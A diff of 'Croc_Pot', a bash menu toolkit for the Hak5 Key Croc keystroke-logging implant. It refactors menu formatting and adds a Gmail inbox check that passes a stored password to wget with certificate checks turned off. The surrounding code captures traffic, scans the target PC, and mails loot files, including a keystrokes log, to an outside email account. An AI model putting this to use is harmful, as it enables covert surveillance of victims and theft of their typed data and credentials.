@@ -5,7 +5,7 @@
 # Description:   Send E-mail, Status of keycroc, Basic Nmap, TCPdump, Install payload,
 #                SSH to HAK5 gear, Reverse ssh tunnel, and more
 # Author:        Spywill
-# Version:       1.6.1
+# Version:       1.6.2
 # Category:      Key Croc
 ##
 ##
@@ -14,6 +14,7 @@
 LINE=$(perl -e 'print "=" x 80,"\n"')
 LINE_=$(perl -e 'print "*" x 10,"\n"')
 LINE_A=$(perl -e 'print "-" x 15,"\n"')
+validate_ip="^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))|((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))))$"
 ##
 #----Create Croc_Pot folders
 ##
@@ -28,7 +29,7 @@ fi
 green='\e[40;32m'
 blue='\e[40;34m'
 red='\e[40;31m'
-white='\e[97m'
+white='\e[40;97m'
 yellow='\e[40;93m'
 clear='\e[0m'
 ##
@@ -53,16 +54,19 @@ MenuTitle() {
 	echo -ne "\n\t\t\t\e[41;4;1m${*}${clear}\n"
 }
 MenuColor() {
-	echo -ne "\t\t\t\e[40;1m${1}${clear}${green}->${clear}\e[40;38;5;202;4m${@:2}"
+	local m_c='\e[40;38;5;202;4m'
+	echo -ne "\t\t\t\e[40;1m${2}${clear}${green}->${clear}" ; echo -ne "$(awk -v m=${1} '{printf("'${m_c}'%-'${1}'s\n", $0)}' <<< ${@:3})${clear}\n"
 }
 MenuEnd() {
-	echo -ne "\t\t\t\e[40;1m0${clear}${green}->${clear}\e[40;4;32mEXIT           ${array[3]} ${clear} 
+	echo -ne "\t\t\t\e[40;1m0${clear}${green}->${clear}\e[40;4;32mEXIT            ${clear}${green}${array[3]}${clear} 
 \t\t$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]: ')"
 	unset m_a
 	read m_a
 }
 Info_Screen() {
-	echo -ne "\n\e[48;5;202;30m${LINE}${clear}\n${yellow}${*}\n\e[48;5;202;30m${LINE}${clear}\n"
+	echo -ne "\n\e[48;5;202;30m${LINE}${clear}" | awk -v m=80 '{printf("%-80s\n", $0)}'
+	echo -ne "${1}" | awk -v m=80 '{printf("'${yellow}'%-80s'${clear}'\n", $0)}' | sed '1d'
+	echo -ne "\e[48;5;202;30m${LINE}${clear}" | awk -v m=80 '{printf("%-80s\n", $0)}'
 }
 ##
 #----Croc_Pot title function
@@ -72,31 +76,21 @@ function croc_title() {
 #----Test internet connection
 ##
 internet_test() {
-	ping -c 1 -w 1 "8.8.8.8" &>"/dev/null"
+	ping -q -c 1 -w 1 "8.8.8.8" &>"/dev/null"
 if [[ $? -ne 0 ]]; then
-	echo -ne "${red}Offline"
+	echo -ne "Offline" | awk -v m=10 '{printf("'${red}'%-10s\n", $0)}'
 elif [[ "${#args[@]}" -eq 0 ]]; then
-	echo -ne "${green}Online "
-fi
-}
-##
-#----Fill in space
-##
-FILL_IN() {
-if [ "$(OS_CHECK)" = WINDOWS ]; then
-	echo -ne "   "
-elif [ "$(OS_CHECK)" = LINUX ]; then
-	echo -ne "     "
+	echo -ne "Online" | awk -v m=10 '{printf("'${green}'%-10s\n", $0)}'
 fi
 }
 ##
 #----Croc_Pot title display info
 ##
 	echo -ne "\n\n\e[41;38;5;232m${LINE}${clear}
-${red}${LINE_A}${clear}\e[40m»${clear}${red}KEYCROC${clear}\e[40m-${clear}${red}HAK${clear}\e[40m${array[0]} ${clear}\e[40m«${clear}${red}---------${clear}\e[41;38;5;232m${array[1]}${clear}${yellow} $(hostname) IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(internet_test)         ${clear}
-${red}   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m               ${clear}\e[41;38;5;232m§${clear}${yellow} $(hostname) VER: $(cat /root/udisk/version.txt) *TARGET-PC:${green}$(OS_CHECK)$(FILL_IN)${clear}
-${red}   DATE OF SCAN${clear}\e[40m $(date +%b-%d-%y---%r)${clear}\e[41;38;5;232mΩ${clear}${yellow} $(hostname) keyboard: $(sed -n 9p /root/udisk/config.txt)           ${clear}
-${red}${LINE_A}${clear}\e[40;92m»CROC_POT«${red}--${clear}${yellow}VER:1.6.1${red}---${clear}\e[41;38;5;232m${array[2]}${clear}${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
+\e[40;38;5;202m»»»»»»»»»»»»»${clear}${red}KEYCROC${clear}\e[40m-${clear}${red}HAK${clear}\e[40m${array[0]}${clear}\e[40;38;5;202m««««««««««««««${clear}\e[41;38;5;232m${array[1]}${clear}${yellow} $(hostname) IP: $(awk -v m=20 '{printf("%-20s\n", $0)}' <<< $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-))${clear}$(internet_test)${clear}
+${blue}DEVELOPED BY ${clear}${yellow}SPYWILL ${clear}\e[40m                  ${clear}\e[41;38;5;232m§${clear}${yellow} $(hostname) VER: $(cat /root/udisk/version.txt) *TARGET-PC:${green}$(awk -v m=10 '{printf("%-10s\n", $0)}' <<< $(OS_CHECK))${clear}
+${blue}$(awk -v m=17 '{printf("%-17s\n", $0)}' <<< $(curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=timezone))${clear}\e[40m $(date +%b-%d-%y-%r)${clear}\e[41;38;5;232mΩ${clear}${yellow} $(hostname) keyboard: $(sed -n 9p /root/udisk/config.txt)           ${clear}
+${green}»»»»»»»»»»CROC_POT««««««${clear}${yellow}VER:1.6.2${clear}${green}««««««${clear}\e[41;38;5;232m${array[2]}${clear}${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(awk -v m=6 '{printf("%-6s\n", $0)}' <<< $(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}')) MEM:$(awk -v m=8 '{printf("%-8s\n", $0)}' <<< $(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }'))${clear}
 \e[41;38;5;232m${LINE}${clear}\n\n"
 }
 ##
@@ -258,14 +252,14 @@ function croc_logs_mean() {
 	LED B
 	croc_title
 MenuTitle KEYCROC LOG MENU
-echo -ne "\t\t" ; MenuColor 1 MESSAGES LOG | tr -d '\t' ; echo -ne " ${clear}" ; MenuColor 8 AUTH LOG | tr -d '\t' ; echo -ne "         ${clear}\n"
-echo -ne "\t\t" ; MenuColor 2 KERNEL LOG | tr -d '\t' ; echo -ne "   ${clear}" ; MenuColor 9 DMESG LOG | tr -d '\t' ; echo -ne "        ${clear}\n"
-echo -ne "\t\t" ; MenuColor 3 SYSTEM LOG | tr -d '\t' ; echo -ne "   ${clear}" ; MenuColor 10 BOOTSTRAP LOG | tr -d '\t' ; echo -ne "   ${clear}\n"
-echo -ne "\t\t" ; MenuColor 4 SYSSTAT LOG | tr -d '\t' ; echo -ne "  ${clear}" ; MenuColor 11 ALTERNATIVES LOG | tr -d '\t' ; echo -ne "${clear}\n"
-echo -ne "\t\t" ; MenuColor 5 DEBUG LOG | tr -d '\t' ; echo -ne "    ${clear}" ; MenuColor 12 MAIL INFO LOG | tr -d '\t' ; echo -ne "   ${clear}\n"
-echo -ne "\t\t" ; MenuColor 6 DPKG LOG | tr -d '\t' ; echo -ne "     ${clear}" ; MenuColor 13 DAEMON LOG | tr -d '\t' ; echo -ne "      ${clear}\n"
-echo -ne "\t\t" ; MenuColor 7 NTPSTATS LOG | tr -d '\t' ; echo -ne " ${clear}" ; MenuColor 14 KEYSTROKES LOG | tr -d '\t' ; echo -ne "  ${clear}\n"
-MenuColor 15 RETURN TO MAIN MENU ; echo -ne "${clear}\n"
+echo -ne "\t\t" ; MenuColor 19 1 MESSAGES LOG | tr -d '\t\n' ; MenuColor 20 8 AUTH LOG | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 19 2 KERNEL LOG | tr -d '\t\n' ; MenuColor 20 9 DMESG LOG | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 19 3 SYSTEM LOG | tr -d '\t\n' ; MenuColor 19 10 BOOTSTRAP LOG | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 19 4 SYSSTAT LOG | tr -d '\t\n' ; MenuColor 19 11 ALTERNATIVES LOG | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 19 5 DEBUG LOG | tr -d '\t\n' ; MenuColor 19 12 MAIL INFO LOG | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 19 6 DPKG LOG | tr -d '\t\n' ; MenuColor 19 13 DAEMON LOG | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 19 7 NTPSTATS LOG | tr -d '\t\n' ; MenuColor 19 14 KEYSTROKES LOG | tr -d '\t'
+MenuColor 19 15 RETURN TO MAIN MENU
 MenuEnd
 	case $m_a in
 	1) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}MESSAGES_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/messages | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
@@ -296,26 +290,18 @@ function croc_mail() {
 	local PYTHON_MAIL=/root/udisk/tools/Croc_Pot/Croc_Mail.py
 	local USER_CR=/root/udisk/tools/Croc_Pot/user_email.txt
 	LED B
-	echo -ne "$(Info_Screen '-Send E-Mail with gmail or OutLook
+	echo -ne "$(Info_Screen '
+-Send E-Mail with gmail or OutLook
 -Select gmail or outlook then Enter e-mail address
 -Enter e-mail password then Enter the e-mail to send to
 -Add MESSAGE and/or Add Attachment')\n\n"
 ##
-#----User Smtp input Function
+#----User Smtp Menu input Function
 ##
 user_smtp() {
-MenuTitle SELECT EMAIL PROVIDER
-MenuColor 1 GMAIL ; echo -ne "               ${clear}\n"
-MenuColor 2 OUTLOOK ; echo -ne "             ${clear}\n"
-MenuColor 3 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
-MenuEnd
+MenuTitle SELECT EMAIL PROVIDER ; MenuColor 19 1 GMAIL ; MenuColor 19 2 OUTLOOK ; MenuColor 19 3 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) local GMAIL=smtp.gmail.com ; echo ${GMAIL} >> ${USER_CR} ;;
-	2) local OUTLOOK=smtp-mail.outlook.com ; echo ${OUTLOOK} >> ${USER_CR} ;;
-	3) main_menu ;;
-	0) exit 0 ;;
-	[bB]) main_menu ;;
-	*) invalid_entry ; user_smtp ;;
+	1) local GMAIL=smtp.gmail.com ; echo ${GMAIL} >> ${USER_CR} ;; 2) local OUTLOOK=smtp-mail.outlook.com ; echo ${OUTLOOK} >> ${USER_CR} ;; 3) main_menu ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; user_smtp ;;
 	esac
 }
 ##
@@ -387,25 +373,11 @@ fi
 ##
 #----Croc Mail Select File Menu
 ##
-MenuTitle SELECT FILE TO E-MAIL
-MenuColor 1 NMAP SCAN ; echo -ne "           ${clear}\n"
-MenuColor 2 KEYCROC LOG ; echo -ne "         ${clear}\n"
-MenuColor 3 WINDOW SCAN ; echo -ne "         ${clear}\n"
-MenuColor 4 KEYCROC INFO ; echo -ne "        ${clear}\n"
-MenuColor 5 ADD ATTACHMENT ; echo -ne "      ${clear}\n"
-MenuColor 6 KEYSTORKES LOG ; echo -ne "      ${clear}\n"
-MenuColor 7 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
-MenuEnd
+MenuTitle SELECT FILE TO E-MAIL ; MenuColor 19 1 NMAP SCAN ; MenuColor 19 2 KEYCROC LOG ; MenuColor 19 3 WINDOW SCAN ; MenuColor 19 4 KEYCROC INFO
+MenuColor 19 5 ADD ATTACHMENT ; MenuColor 19 6 KEYSTORKES LOG ; MenuColor 19 7 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt B NMAP SCAN nmap_menu ;;
-	2) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt C KEYCROC LOG croc_logs_mean ;;
-	3) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt D WINDOWS SCAN croc_pot_plus ;;
-	4) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt E KEYCROC STATUS croc_status ;;
-	5) send_file_e ;;
-	6) send_file_f ;;
-	7) main_menu ;;
-	0) exit 0 ;;
-	*) invalid_entry ; mail_file ;;
+	1) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt B NMAP SCAN nmap_menu ;; 2) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt C KEYCROC LOG croc_logs_mean ;; 3) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt D WINDOWS SCAN croc_pot_plus ;;
+	4) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt E KEYCROC STATUS croc_status ;; 5) send_file_e ;; 6) send_file_f ;; 7) main_menu ;; 0) exit 0 ;; *) invalid_entry ; mail_file ;;
 	esac
 }
 ##
@@ -427,6 +399,52 @@ text = msg.as_string()\nserver.sendmail(email, send_to_email, text)\nserver.quit
 ##
 if [ -e "${USER_CR}" ]; then
 echo -ne "${yellow}EXISTING E-MAIL: ${clear}${green}$(sed -n 2p ${USER_CR})${clear}\n"
+##
+#----Mail check existing email for new messages
+##
+local check_gmail="$(sed -n 1p /root/udisk/tools/Croc_Pot/user_email.txt)"
+if [[ "${check_gmail}" == "smtp.gmail.com" ]]; then
+read_all CHECK E-MAIL FOR NEW MESSAGES Y/N AND PRESS [ENTER]
+case $r_a in
+[yY] | [yY][eE][sS])
+	local USER="$(sed -n 2p /root/udisk/tools/Croc_Pot/user_email.txt)"
+	local PASS="$(sed -n 3p /root/udisk/tools/Croc_Pot/user_email.txt)"
+	check_inbox=`echo wget -T 3 -t 1 -q --secure-protocol=TLSv1 --no-check-certificate \ --user=$USER --password=$PASS https://mail.google.com/mail/feed/atom -O -`
+	${check_inbox} | while IFS=\> read -d \< E C; do
+if [[ $E = "fullcount" ]] ; then
+	if [[ $C == 0 ]]; then
+	echo "No new messages."
+	break
+else
+	echo "$C New Messages:"
+	echo -ne "${LINE}\n"
+	fi
+fi
+if [[ $E = "title" ]]; then
+	echo -ne "\n${LINE}\n$C"
+fi
+if [[ $E = "issued" ]]; then
+	echo "	$C"
+fi
+if [[ $E = "summary" ]]; then
+	echo "$C [...]"
+fi
+if [[ $E = "name" ]]; then
+	echo "	$C"
+fi
+if [[ $E = "email" ]]; then
+	echo "	$C"
+fi
+done ;;
+[nN] | [nN][oO])
+	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
+*)
+	invalid_entry ; croc_mail ;;
+esac
+fi
+##
+#----Mail keep/remove existing e-mail
+##
 read_all USE EXISTING E-MAIL CREDENTIALS Y/N AND PRESS [ENTER]
 case $r_a in
 [yY] | [yY][eE][sS])
@@ -454,7 +472,7 @@ case $r_a in
 	read_all ENTER MESSAGE AND PRESS [ENTER] ;;
 [nN] | [nN][oO])
 	unset r_a
-	local DEF_MESS=$(perl -e 'print "KEYCROC-HAK5---DEVELOPED BY SPYWILL ---Croc_Mail"')
+	local DEF_MESS=$(perl -e 'print "KEYCROC-HAK5---DEVELOPED BY SPYWILL---Croc_Mail"')
 	local MY_MESS_A=${DEF_MESS} ;;
 *)
 	invalid_entry ; croc_mail ;;
@@ -483,49 +501,40 @@ function croc_pot_plus() {
 #----Recon scan menu/Function
 ##
 croc_recon() {
-	echo -ne "$(Info_Screen 'Perform some basic recon scan')\n"
+	echo -ne "$(Info_Screen '
+-Perform some basic recon scan')\n"
 ##
 #----Recon Tcpdump Menu/Function
 ##
 tcpdump_scan() {
 	local LOOT_TCPDUMP=/root/udisk/loot/Croc_Pot/tcpdump.pcap
-	rm ${LOOT_TCPDUMP}
-	echo -ne "$(Info_Screen '-Start some basic Tcpdump scan and save to Loot/Croc_Pot folder
+	rm ${LOOT_TCPDUMP} 2> /dev/null
+	echo -ne "$(Info_Screen '
+-Start some basic Tcpdump scan and save to Loot/Croc_Pot folder
 -PRESS CTRL + C TO STOP TCPDUMP SCAN')\n"
-MenuTitle TCPDUMP SCAN MENU
-MenuColor 1 INTERFACE SCAN ; echo -ne "            ${clear}\n"
-MenuColor 2 PACKETS IN HEX AND ASCll ; echo -ne "  ${clear}\n"
-MenuColor 3 PACKETS WITH IP ADDRESS ; echo -ne "   ${clear}\n"
-MenuColor 4 CURRENT NETWORK INTERFACE ; echo -ne " ${clear}\n"
-MenuColor 5 ENTER AN TCPDUMP SCAN ; echo -ne "     ${clear}\n"
-MenuColor 6 RETURN TO MAIN MENU ; echo -ne "       ${clear}\n"
-MenuEnd
+MenuTitle TCPDUMP SCAN MENU ; MenuColor 25 1 INTERFACE SCAN ; MenuColor 25 2 PACKETS IN HEX AND ASCll ; MenuColor 25 3 PACKETS WITH IP ADDRESS
+MenuColor 25 4 CURRENT NETWORK INTERFACE ; MenuColor 25 5 ENTER AN TCPDUMP SCAN ; MenuColor 25 6 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) tcpdump -D | tee ${LOOT_TCPDUMP} ; tcpdump_scan ;;
-	2) tcpdump -XX -i any | tee ${LOOT_TCPDUMP} ; tcpdump_scan ;;
-	3) tcpdump -n -i any | tee ${LOOT_TCPDUMP} ; tcpdump_scan ;;
-	4) tcpdump | tee ${LOOT_TCPDUMP} ; tcpdump_scan ;;
-	5) read_all ENTER TCPDUMP SCAN THEN PRESS [ENTER] && ${r_a} | tee ${LOOT_TCPDUMP} ; tcpdump_scan ;;
-	6) main_menu ;;
-	0) exit 0 ;;
-	[bB]) croc_recon ;;
-	*) invalid_entry ; tcpdump_scan ;;
+	1) tcpdump -D | tee ${LOOT_TCPDUMP} ; tcpdump_scan ;; 2) tcpdump -XX -i any | tee ${LOOT_TCPDUMP} ; tcpdump_scan ;; 3) tcpdump -n -i any | tee ${LOOT_TCPDUMP} ; tcpdump_scan ;;
+	4) tcpdump | tee ${LOOT_TCPDUMP} ; tcpdump_scan ;; 5) read_all ENTER TCPDUMP SCAN THEN PRESS [ENTER] && ${r_a} | tee ${LOOT_TCPDUMP} ; tcpdump_scan ;;
+	6) main_menu ;; 0) exit 0 ;; [bB]) croc_recon ;; *) invalid_entry ; tcpdump_scan ;;
 	esac
 }
 ##
 #----Recon Nmap mean/Function
 ##
 function nmap_menu() {
+	echo -ne "$(Info_Screen '
+-Start some basic nmap scan and save to loot folder
+-Enter IP for scan or default will be target pc ip')\n"
 	local IP_WLAN=$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)
 	local LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
-	echo -ne "$(Info_Screen '-Start some basic nmap scan and save to loot folder
--Enter IP for scan or default will be target pc ip')\n\n"
 ##
 #----Nmap User IP Input Function
 ##
 user_ip_f() {
 read_all ENTER IP TO USE FOR NMAP SCAN AND PRESS [ENTER]
-if [[ "${r_a}" =~ ^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))|((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))))$ ]]; then
+if [[ "${r_a}" =~ ${validate_ip} ]]; then
 	IP_SETUP=${r_a}
 	echo -ne "\t${LINE_}$(ColorGreen 'USING IP THAT WAS ENTER')${r_a}\n"
 else
@@ -549,18 +558,8 @@ fi
 #----Nmap Scan Menu
 ##
 LED B
-MenuTitle NMAP MENU
-MenuColor 1 REGULAR SCAN ; echo -ne "         ${clear}\n"
-MenuColor 2 QUICK SCAN ; echo -ne "           ${clear}\n"
-MenuColor 3 QUICK PLUS ; echo -ne "           ${clear}\n"
-MenuColor 4 PING SCAN ; echo -ne "            ${clear}\n"
-MenuColor 5 INTENSE SCAN ; echo -ne "         ${clear}\n"
-MenuColor 6 INTERFACE SCAN ; echo -ne "       ${clear}\n"
-MenuColor 7 PORT SCAN ; echo -ne "            ${clear}\n"
-MenuColor 8 PERSONAL SCAN ; echo -ne "        ${clear}\n"
-MenuColor 9 TARGET PC SCAN ; echo -ne "       ${clear}\n"
-MenuColor 10 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
-MenuEnd
+MenuTitle NMAP MENU ; MenuColor 20 1 REGULAR SCAN ; MenuColor 20 2 QUICK SCAN ; MenuColor 20 3 QUICK PLUS ; MenuColor 20 4 PING SCAN ; MenuColor 20 5 INTENSE SCAN
+MenuColor 20 6 INTERFACE SCAN ; MenuColor 20 7 PORT SCAN ; MenuColor 20 8 PERSONAL SCAN ; MenuColor 20 9 TARGET PC SCAN ; MenuColor 19 10 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
 	1) user_ip_f ; croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP REGULAR SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP} ; nmap_menu ;;
 	2) user_ip_f ; croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP QUICK SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -T4 -F ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP} ; nmap_menu ;;
@@ -570,11 +569,7 @@ MenuEnd
 	6) croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP INTERFACE SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap --iflist | tee -a ${LOOT_NMAP} ; nmap_menu ;;
 	7) user_ip_f ; croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PORT SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap --top-ports 20 ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP} ; nmap_menu ;;
 	8) croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PERSONAL SCAN${LINE_}\n" ; read_all ENTER PERSONAL NMAP SCAN SETTING THEN PRESS [ENTER] && ${r_a} | tee -a ${LOOT_NMAP} ; nmap_menu ;;
-	9) pc_scan ; nmap_menu ;;
-	10) main_menu ;;
-	0) exit 0 ;;
-	[bB]) croc_recon ;;
-	*) invalid_entry ; nmap_menu ;;
+	9) pc_scan ; nmap_menu ;; 10) main_menu ;; 0) exit 0 ;; [bB]) croc_recon ;; *) invalid_entry ; nmap_menu ;;
 	esac
 }
 ##
@@ -598,7 +593,8 @@ esac
 ##
 traceroute_scan() {
 	clear
-	echo -ne "$(Info_Screen 'Traceroute scan enter IP or web site name')\n\n"
+	echo -ne "$(Info_Screen '
+-Traceroute scan enter IP or web site name')\n\n"
 	scan_all traceroute_scan traceroute
 }
 ##
@@ -606,7 +602,8 @@ traceroute_scan() {
 ##
 whois_scan() {
 	clear
-	echo -ne "$(Info_Screen 'Whois Lookup scan enter IP or web site name')\n\n"
+	echo -ne "$(Info_Screen '
+-Whois Lookup scan enter IP or web site name')\n\n"
 	install_package whois WHOIS whois_scan croc_recon
 	scan_all whois_scan whois
 }
@@ -615,7 +612,8 @@ whois_scan() {
 ##
 dns_scan() {
 	clear
-	echo -ne "$(Info_Screen 'DNS Lookup scan enter IP or web site name')\n\n"
+	echo -ne "$(Info_Screen '
+-DNS Lookup scan enter IP or web site name')\n\n"
 	install_package dnsutils DNSUTILS dns_scan croc_recon
 	scan_all dns_scan dig
 }
@@ -624,15 +622,17 @@ dns_scan() {
 ##
 target_ping() {
 	clear
-	echo -ne "$(Info_Screen 'Ping scan enter IP or web site name')\n\n"
-	scan_all target_ping ping -c 5 -w 5
+	echo -ne "$(Info_Screen '
+-Ping scan enter IP or web site name')\n\n"
+	scan_all target_ping ping -q -c 5 -w 5
 }
 ##
 #----Recon Port scan with Netcat Function
 ##
 target_port() {
 	clear
-	echo -ne "$(Info_Screen '-Port scan with Netcat enter IP or web site name
+	echo -ne "$(Info_Screen '
+-Port scan with Netcat enter IP or web site name
 -Port range will start at port 1 enter port range to stop
 -Click Ctrl+C to stop script')\n\n"
 	read_all START SCAN Y/N AND PRESS [ENTER]
@@ -665,7 +665,8 @@ esac
 ##
 ssl_scan() {
 	clear
-	echo -ne "$(Info_Screen 'Scanning TLS/SSL configuration with SSLscan
+	echo -ne "$(Info_Screen '
+-Scanning TLS/SSL configuration with SSLscan
 -SSLscan is a command-line tool example: sslscan google.com:443')\n\n"
 	install_package sslscan SSLSCAN ssl_scan croc_recon
 	scan_all ssl_scan sslscan --no-failed
@@ -673,30 +674,11 @@ ssl_scan() {
 ##
 #----Recon scan menu
 ##
-MenuTitle RECON SCAN MENU
-MenuColor 1 TCPDUMP SCAN ; echo -ne "        ${clear}\n"
-MenuColor 2 NMAP SCAN ; echo -ne "           ${clear}\n"
-MenuColor 3 TRACEROUTE SCAN ; echo -ne "     ${clear}\n"
-MenuColor 4 WHOIS LOOKUP SCAN ; echo -ne "   ${clear}\n"
-MenuColor 5 DNS LOOKUP SCAN ; echo -ne "     ${clear}\n"
-MenuColor 6 PING TARGET SCAN ; echo -ne "    ${clear}\n"
-MenuColor 7 TARGET PORT SCAN ; echo -ne "    ${clear}\n"
-MenuColor 8 SSL/TLS SSLSCAN ; echo -ne "     ${clear}\n"
-MenuColor 9 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
-MenuEnd
